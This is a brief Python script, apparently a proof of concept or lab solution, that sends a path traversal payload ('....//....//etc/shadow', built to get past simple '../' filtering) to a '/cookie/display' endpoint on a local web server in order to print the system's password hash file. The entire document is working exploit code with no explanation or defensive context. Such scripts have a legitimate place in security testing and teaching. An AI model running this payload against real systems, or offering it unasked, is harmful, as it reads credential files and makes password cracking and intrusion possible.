import requests

port = "5000"
url = f"http://localhost:{port}"
path = "....//....//etc/shadow"

r = requests.get(url + "/cookie/display", {"cookie": path})

print(r.text)